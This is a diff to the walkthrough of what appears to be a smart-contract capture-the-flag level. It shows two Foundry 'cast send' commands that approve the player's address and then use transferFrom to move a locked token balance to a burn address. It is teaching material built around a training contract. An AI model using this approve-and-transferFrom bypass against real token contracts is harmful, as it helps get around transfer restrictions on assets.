@@ -73,13 +73,13 @@ The `transferFrom` function seems unsafe at first but it is crucial for tasks su
 
 ### Walkthrough
 
-1. Approving our address to spend our tokens so that we can use the "transferFrom" function
+##### 1. Approving our address to spend our tokens so that we can use the "transferFrom" function
 ```console
 cast send $LEVEL_ADDRESS "approve(address,uint256)" 0x527B0642b3902C3Bc29ae13D8208b86dA007aa26 \
 1000000000000000000000000 --private-key $PRIVATE_KEY
 ```
 
-2. Calling contract's "transferFrom(address from, address to, uint256 amount)" function to transfer all tokens to a burn address
+##### 2. Calling contract's "transferFrom(address from, address to, uint256 amount)" function to transfer all tokens to a burn address
 ```console
 cast send $LEVEL_ADDRESS "transferFrom(address,address,uint256)" 0x527B0642b3902C3Bc29ae13D8208b86dA007aa26 \
 0x000000000000000000000000000000000000dEaD 1000000000000000000000000 --private-key $PRIVATE_KEY
